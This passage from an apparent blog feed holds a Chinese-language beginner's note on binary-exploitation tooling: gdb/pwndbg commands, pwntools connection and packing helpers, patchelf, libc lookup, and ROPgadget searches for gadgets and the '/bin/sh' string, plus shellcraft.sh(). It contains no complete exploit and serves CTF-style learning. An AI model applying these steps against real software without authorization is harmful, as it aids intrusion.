list)</a></p>\n</li>\n<li><p>The course <a href=\"https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Dbg1012_GDB_1+2021_v1/course/\">Debuggers 1012: Introductory GDB</a> from OpenSecurityTraining2.</p>\n</li>\n</ul>\n<p>pwn.college <a href=\"https://www.youtube.com/watch?v=r185fCzdw8Y\">https://www.youtube.com/watch?v=r185fCzdw8Y</a></p>\n<p>pwndbg官方文档:<a href=\"https://browserpwndbg.readthedocs.io/en/docs/\">https://browserpwndbg.readthedocs.io/en/docs/</a></p>\n<p><a href=\"https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md\">https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md</a></p>\n<p>gdb官方文档:</p>\n<h3 id=\"调整\"><a href=\"#调整\" class=\"headerlink\" title=\"调整\"></a>调整</h3><p>把 stack 和 backtrace的行数减少,不然看不见上面的汇编了</p>\n<p>配置文件:<a href=\"https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md\">https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md</a></p>\n<p>修改配置文件就可以了</p>\n<p>找到pwndbg的下载目录的这个文件<a href=\"https://github.com/pwndbg/pwndbg\">pwndbg</a>&#x2F;<a href=\"https://github.com/pwndbg/pwndbg/tree/dev/pwndbg\">pwndbg</a>&#x2F;<a href=\"https://github.com/pwndbg/pwndbg/tree/dev/pwndbg/commands\">commands</a>&#x2F;<strong>context.py</strong> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">751行</span><br><span class=\"line\">stack_lines = pwndbg.gdblib.config.add_param(</span><br><span class=\"line\">    &quot;context-stack-lines&quot;, 8, &quot;number of lines to print in the stack context&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\">766行</span><br><span class=\"line\">backtrace_lines = pwndbg.gdblib.config.add_param(</span><br><span class=\"line\">    &quot;context-backtrace-lines&quot;, 8, &quot;number of lines to print in the backtrace context&quot;</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"启动调试\"><a href=\"#启动调试\" class=\"headerlink\" title=\"启动调试\"></a>启动调试</h3><p>gdb filename</p>\n<p>gdb processName PID 或者 gdb -p <PID></PID></p>\n<p>添加参数 </p>\n<p>gdb -args .&#x2F;a.out a b c</p>\n<h3 id=\"断点相关\"><a href=\"#断点相关\" class=\"headerlink\" title=\"断点相关\"></a>断点相关</h3><p>b 函数名,如果有符号表的话可以,例如b gets</p>\n<p>b 地址  例如:b *0x3123213  这样打</p>\n<p>info b 查看断点信息</p>\n<p>delete n 删除n号断点</p>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p>r 运行程序,会一直运行,直到比如需要输入什么东西等</p>\n<p>s 从头开始运行,断到第一行</p>\n<p>c 运行到下一个断点</p>\n<p>调试地址 就是 这个程序的基地址 + ida中的地址</p>\n<p>n 单步执行,(有函数的话直接跳过不进入)</p>\n<p>s 单步进入,有函数的话会进入</p>\n<p>finish 执行完当前函数,返回调用它的函数</p>\n<p>怎么查看自己当前在哪一行??和下面的代码??</p>\n<p>disass </p>\n<p>运行的时候 怎么 添加参数?</p>\n<h3 id=\"查看信息\"><a href=\"#查看信息\" class=\"headerlink\" title=\"查看信息\"></a>查看信息</h3><p>codebase 查看地址 (调试地址 就是 这个程序的基地址 + ida中的地址)</p>\n<p>vmmap查看内存映射mmap地址 信息</p>\n<p>teles 查看栈的信息</p>\n<p>p  变量名 查看变量地址</p>\n<p>info </p>\n<p>reg 查看寄存器信息</p>\n<p>dereference $esp 是啥??</p>\n<h4 id=\"查看内存信息\"><a href=\"#查看内存信息\" class=\"headerlink\" title=\"查看内存信息\"></a>查看内存信息</h4><p>使用examine命令（简写是x）来查看内存地址中的值</p>\n<p>x&#x2F;nuf <addr> 例如x &#x2F;20wx 0x0000000</addr></p>\n<p>n是个数,表示从当前地址往后显示的内存的长度,即显示几个地址的内容</p>\n<p>u表示,从当前地址往后请求的字节数,不指定的话默认4bytes,32位.b表示单字节，h表示双字节，w表示四字节，g表示八字节。</p>\n<p> f是显示的格式( i可以查看汇编代码)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20220929162158033.png\" alt=\"image-20220929162158033\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4b</span>x <span class=\"number\">0x7fffffffe490</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe490</span>:\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x80</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>hx <span class=\"number\">0x7fffffffe490</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe490</span>:\t<span class=\"number\">0x8000</span>\t<span class=\"number\">0x0000</span>\t<span class=\"number\">0x0001</span>\t<span class=\"number\">0x0000</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>wx <span class=\"number\">0x7fffffffe490</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe490</span>:\t<span class=\"number\">0x00008000</span>\t<span class=\"number\">0x00000001</span>\t<span class=\"number\">0x55554759</span>\t<span class=\"number\">0x00005555</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>gx <span class=\"number\">0x7fffffffe490</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe490</span>:\t<span class=\"number\">0x0000000100008000</span>\t<span class=\"number\">0x0000555555554759</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe4a0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0xa2698e7a0212c01a</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"堆相关\"><a href=\"#堆相关\" class=\"headerlink\" title=\"堆相关\"></a>堆相关</h3><p>heap 查看堆的信息</p>\n<p>heap bins 查看bins的信息</p>\n<p>heap chunks 查看chunk的信息</p>\n<p>Vis 查看堆内存</p>\n<h3 id=\"修改内存、寄存器等-方便调试\"><a href=\"#修改内存、寄存器等-方便调试\" class=\"headerlink\" title=\"修改内存、寄存器等 方便调试\"></a>修改内存、寄存器等 方便调试</h3><p>set $eip &#x3D; xxxx</p>\n<p>set {unsigned int}0x8048a51&#x3D;0x0</p>\n<p>find 内存搜索</p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>watch 监测点?</p>\n<p>canary</p>\n<p>q 退出</p>\n<p>display &#x2F;3i $rip 设置单步执行后自动显示的内容,这里显示后续三条指令</p>\n<p>查看寄存器</p>\n<p>(gdb) i r (gdb) i r a # 查看所有<a href=\"https://so.csdn.net/so/search?q=%E5%AF%84%E5%AD%98%E5%99%A8&spm=1001.2101.3001.7020\">寄存器</a>（包括<a href=\"https://so.csdn.net/so/search?q=%E6%B5%AE%E7%82%B9&spm=1001.2101.3001.7020\">浮点</a>、多媒体） (gdb) i r esp (gdb) i r pc</p>\n<p>info reg</p>\n<p>调试一下输出为16进制吧: set output-radix 16</p>\n<p>eb address [data [data …]]</p>\n<h3 id=\"结构体相关\"><a href=\"#结构体相关\" class=\"headerlink\" title=\"结构体相关\"></a>结构体相关</h3><p>p 结构体名字</p>\n<p>p *(struct  xxx *) addr</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(DSI *) dsi</span><br><span class=\"line\">value of type `DSI<span class=\"number\">&#x27;</span> requires <span class=\"number\">67416</span> bytes, which is more than max-value-size</span><br><span class=\"line\">pwndbg&gt; p dsi</span><br><span class=\"line\">$<span class=\"number\">4</span> = (DSI *) <span class=\"number\">0x5555555b8960</span></span><br><span class=\"line\">pwndbg&gt; p *(DSI *) <span class=\"number\">0x5555555b8960</span></span><br><span class=\"line\">value of type `DSI<span class=\"number\">&#x27;</span> requires <span class=\"number\">67416</span> bytes, which is more than max-value-size</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"调试技巧\"><a href=\"#调试技巧\" class=\"headerlink\" title=\"调试技巧\"></a>调试技巧</h2><p>下好断点,然后多用c,在堆的调试中很好用</p>\n<p>pwntools中加input()</p>\n<p>gdb中怎么看文件描述符呢,有多少个,打开的  ll &#x2F;proc&#x2F;1562844&#x2F;fd 需要看进程信息</p>\n<p><a href=\"https://www.cnblogs.com/mfryf/p/5329770.html\">https://www.cnblogs.com/mfryf/p/5329770.html</a></p>\n<p>vmmap 查看内存分布</p>\n<h3 id=\"子进程调试\"><a href=\"#子进程调试\" class=\"headerlink\" title=\"子进程调试\"></a>子进程调试</h3><p><a href=\"https://blog.csdn.net/cjfeii/article/details/21647663\">https://blog.csdn.net/cjfeii/article/details/21647663</a></p>\n<p> <strong>set detach-on-fork off</strong></p>\n<p>有好几种模式</p>\n<p>info threads</p>\n<p>切换线程</p>\n<p> info inferiors</p>\n<p><a href=\"https://blog.csdn.net/bsp_mpu6050/article/details/107886383\">https://blog.csdn.net/bsp_mpu6050/article/details/107886383</a></p>\n<h1 id=\"脚本编写-pwntools\"><a href=\"#脚本编写-pwntools\" class=\"headerlink\" title=\"脚本编写:pwntools\"></a>脚本编写:pwntools</h1><p>官方文档:<a href=\"https://docs.pwntools.com/\">https://docs.pwntools.com</a></p>\n<p><a href=\"https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/gdb.html\">https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/gdb.html</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b main&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#io.sendlineafter(&#x27;Input:&#x27;,payload)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.debug(io,<span class=\"string\">&quot;b main&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#io.sendlineafter(&#x27;Input:&#x27;,payload)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://blog.csdn.net/fjh1997/article/details/105434992/\">https://blog.csdn.net/fjh1997/article/details/105434992/</a></p>\n<h3 id=\"配合gdb\"><a href=\"#配合gdb\" class=\"headerlink\" title=\"配合gdb\"></a>配合gdb</h3><p>在输入一段数据后 断下,比如字符串的那个例子,我们想要查看刚刚输入完数据后的情况,</p>\n<p>第一种方法,找到断点</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"number\">0x5655563b</span> &lt;fmtstr+<span class=\"number\">110</span>&gt;    push   <span class=\"number\">0x63</span></span><br><span class=\"line\">  <span class=\"number\">0x5655563d</span> &lt;fmtstr+<span class=\"number\">112</span>&gt;    lea    eax, [ebp - <span class=\"number\">0x70</span>]</span><br><span class=\"line\">► <span class=\"number\">0x56555640</span> &lt;fmtstr+<span class=\"number\">115</span>&gt;    push   eax</span><br><span class=\"line\">  <span class=\"number\">0x56555641</span> &lt;fmtstr+<span class=\"number\">116</span>&gt;    call   fgets@plt                    &lt;fgets@plt&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"number\">0x56555646</span> &lt;fmtstr+<span class=\"number\">121</span>&gt;    add    esp, <span class=\"number\">0x10</span></span><br><span class=\"line\">  <span class=\"number\">0x56555649</span> &lt;fmtstr+<span class=\"number\">124</span>&gt;    sub    esp, <span class=\"number\">0xc</span></span><br><span class=\"line\">  <span class=\"number\">0x5655564c</span> &lt;fmtstr+<span class=\"number\">127</span>&gt;    lea    eax, [ebp - <span class=\"number\">0x70</span>]</span><br></pre></td></tr></table></figure>\n\n\n\n<p>attach的时候断到断点这里就好了,然后 gdb那边c, 然后pwntools这边执行一下(回车) 即可, 或者不用pause, 直接在gdb那c一下就行了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./vul32&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#io = process(&quot;./pwn3&quot;,&quot;b main&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;break *0x56555646&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.debug(&quot;./vul32&quot;,&quot;break main&quot;)</span></span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;aaaaaa&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"><span class=\"comment\">#io.sendlineafter(&#x27;Input:&#x27;,payload)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>__kernel_vsyscall+ 一上来的这个是什么?????????? 这是进入到了内核里面吧 可以通过backtrace来看</p>\n<p>#6  0xf7e4b29c in _IO_fgets</p>\n<p>#7  0x56555646 in fmtstr ()<br>#8  0x565556a5 in main ()<br>#9  0xf7dfdfa1 in __libc_start_main (main&#x3D;0x56<br>555685 <main>, argc&#x3D;1, argv</main></p>\n<p>确实是进入到断点后的位置</p>\n<p>右边c的时候,需要左边pwntools这边进行输入,右边不能进行输入的</p>\n<p>第二种,直接在开头就断点就好了</p>\n<h2 id=\"pwntools基础操作\"><a href=\"#pwntools基础操作\" class=\"headerlink\" title=\"pwntools基础操作\"></a>pwntools基础操作</h2><p>send和sendline的区别,send只是发送数据,sendline发送一行数据,也就是除了数据,还会加一个换行(回车)</p>\n<p><a href=\"https://blog.csdn.net/weixin_45556441/article/details/113982718\">https://blog.csdn.net/weixin_45556441/article/details/113982718</a></p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>apt-get install libffi-dev,libssl-dev</p>\n<p>pip install pwntools</p>\n<h3 id=\"环境变量设置\"><a href=\"#环境变量设置\" class=\"headerlink\" title=\"环境变量设置\"></a>环境变量设置</h3><p>​\t\t许多都是通过全局变量context进行设置的,例如操作系统,架构,字节序等</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">context.os = <span class=\"string\">&#x27;linux&#x27;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span>  <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"连接及交互\"><a href=\"#连接及交互\" class=\"headerlink\" title=\"连接及交互\"></a>连接及交互</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file = process(<span class=\"string\">&quot;./pwn&quot;</span>)\t\t<span class=\"comment\">#本地文件         </span></span><br><span class=\"line\"></span><br><span class=\"line\">p= remote(<span class=\"string\">&quot;xx.xx.xx.xx&quot;</span>,<span class=\"number\">12345</span>)\t\t<span class=\"comment\">#远程\t\t</span></span><br><span class=\"line\">p.send(payload)    <span class=\"comment\">#发送数据</span></span><br><span class=\"line\">p.sendline(payload) <span class=\"comment\">#发送数据并添加换行符</span></span><br><span class=\"line\">p.senduntil?</span><br><span class=\"line\">p.sendafter(string)</span><br><span class=\"line\">p.sendlineafter()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv(count) <span class=\"comment\"># 接收count长度的信息</span></span><br><span class=\"line\">p.recvuntil(string,drop=<span class=\"literal\">True</span> <span class=\"keyword\">or</span> <span class=\"literal\">False</span>) <span class=\"comment\">#返回直到接收到指定字符串的信息,drop参数可以指定是否包含终止字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.clear() <span class=\"comment\"># 清空消息缓存</span></span><br><span class=\"line\">p.interactive() <span class=\"comment\"># 与程序进行交互</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"编码类\"><a href=\"#编码类\" class=\"headerlink\" title=\"编码类\"></a>编码类</h3><p>​\t\t漏洞利用时,payload可能有各种形式,8.16,32,64位、大端小端,pwntools提供了编码和解码的函数,p开头是编码,u开头是解码,后面跟着的是位数. 此外还提供了asm和disasm两个函数进行汇编和反汇编的转换</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p32(<span class=\"number\">0x8040000</span>)  <span class=\"string\">&#x27;\\x00\\x00\\x04\\x08&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">hex</span>(u32(<span class=\"string\">&#x27;\\x00\\x00\\x04\\x08&#x27;</span>))    <span class=\"string\">&#x27;0x8040000&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"文件信息获取类\"><a href=\"#文件信息获取类\" class=\"headerlink\" title=\"文件信息获取类\"></a>文件信息获取类</h3><p>​\t\t获取二进制文件或者libc等的got plt表地址,或者偏移等</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;bin-path&#x27;</span>) <span class=\"comment\">#加载二进制文件</span></span><br><span class=\"line\">elf.got[<span class=\"string\">&#x27;fun_name&#x27;</span>] <span class=\"comment\">#获取对应函数的got表地址</span></span><br><span class=\"line\">elf.plt[<span class=\"string\">&#x27;fun_name&#x27;</span>] <span class=\"comment\">#获取对应函数的plt表地址</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;libc-path&#x27;</span>) <span class=\"comment\">#加载二进制文件</span></span><br><span class=\"line\">libc.symbols[‘system’] <span class=\"comment\">#获取函数地址   </span></span><br><span class=\"line\">libc.sym[<span class=\"string\">&#x27;system&#x27;</span>] 有什么区别??</span><br></pre></td></tr></table></figure>\n\n<p>symbols和got plt的关系???3</p>\n<h3 id=\"libc地址计算类\"><a href=\"#libc地址计算类\" class=\"headerlink\" title=\"libc地址计算类\"></a>libc地址计算类</h3><h3 id=\"格式化字符串\"><a href=\"#格式化字符串\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h3><h3 id=\"shellcode\"><a href=\"#shellcode\" class=\"headerlink\" title=\"shellcode\"></a>shellcode</h3><p>Shellcraft.sh()</p>\n<h1 id=\"patchelf\"><a href=\"#patchelf\" class=\"headerlink\" title=\"patchelf\"></a>patchelf</h1><p>patchelf –set-interpreter &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;ld-linux.so.2 .&#x2F;a.out<br>patchelf –set-rpath &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F; .&#x2F;a.out\t\t</p>\n<h1 id=\"gadget相关工具\"><a href=\"#gadget相关工具\" class=\"headerlink\" title=\"gadget相关工具\"></a>gadget相关工具</h1><h2 id=\"ROPgadget\"><a href=\"#ROPgadget\" class=\"headerlink\" title=\"ROPgadget\"></a>ROPgadget</h2><p>ROPgadget –binary rop  –only ‘pop|ret’ | grep ‘eax’   </p>\n<p>ROPgadget –binary ret2syscall  –only ‘int’</p>\n<p>ROPgadget –binary ret2syscall  –string ‘&#x2F;bin&#x2F;sh’</p>\n<h1 id=\"objdump\"><a href=\"#objdump\" class=\"headerlink\" title=\"objdump\"></a>objdump</h1><p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230221224643726.png\" alt=\"image-20230221224643726\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230221224632067.png\" alt=\"image-20230221224632067\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230221224616734.png\" alt=\"image-20230221224616734\"></p>\n<h1 id=\"libcsearch\"><a href=\"#libcsearch\" class=\"headerlink\" title=\"libcsearch\"></a>libcsearch</h1><p><a href=\"https://blog.csdn.net/qq_44108455/article/details/105458234\">https://blog.csdn.net/qq_44108455/article/details/105458234</a></p>\n<p><a href=\"https://blog.csdn.net/csdn546229768/article/details/121177641\">https://blog.csdn.net/csdn546229768/article/details/121177641</a></p>\n<p>apt get install zstd</p>\n<h2 id=\"在线搜索libc-libc-database-search\"><a href=\"#在线搜索libc-libc-database-search\" class=\"headerlink\" title=\"在线搜索libc libc database search\"></a>在线搜索libc libc database search</h2><p><a href=\"https://libc.blukat.me/\">https://libc.blukat.me</a></p>\n<p><a href=\"https://libc.rip/\">https://libc.rip</a></p>\n<p><a href=\"https://github.com/niklasb/libc-database\">https://github.com/niklasb/libc-database</a></p>\n<p><a href=\"https://github.com/lieanu/LibcSearcher\">https://github.com/lieanu/LibcSearcher</a></p>\n<h1 id=\"Linux自带工具\"><a href=\"#Linux自带工具\" class=\"headerlink\" title=\"Linux自带工具\"></a>Linux自带工具</h1><h1 id=\"file\"><a href=\"#file\" class=\"headerlink\" title=\"file\"></a>file</h1><p>​\t\t查看文件基本信息</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132901291.png\" alt=\"image-20230222132901291\"></p>\n<h1 id=\"ldd\"><a href=\"#ldd\" class=\"headerlink\" title=\"ldd\"></a>ldd</h1><p>打印依赖的共享库文件</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132915670.png\" alt=\"image-20230222132915670\"></p>\n<h1 id=\"nm\"><a href=\"#nm\" class=\"headerlink\" title=\"nm\"></a>nm</h1><p>打印可执行程序的符号信息</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132921275.png\" alt=\"image-20230222132921275\"></p>\n<h1 id=\"strings\"><a href=\"#strings\" class=\"headerlink\" title=\"strings\"></a>strings</h1><p>查看可打印字符串信息</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132932791.png\" alt=\"image-20230222132932791\"></p>\n<h1 id=\"objdump-1\"><a href=\"#objdump-1\" class=\"headerlink\" title=\"objdump\"></a>objdump</h1><p>打印可执行程序的信息</p>\n<p>-h 打印section头信息</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132942474.png\" alt=\"image-20230222132942474\"></p>\n<p>-d 打印可执行section汇编</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132950821.png\" alt=\"image-20230222132950821\"></p>\n<h1 id=\"readelf\"><a href=\"#readelf\" class=\"headerlink\" title=\"readelf\"></a>readelf</h1><p>查看data段</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/",
            "title": "pwn入门-5-格式化字符串漏洞",
            "date_published": "2023-01-22T04:51:43.000Z",
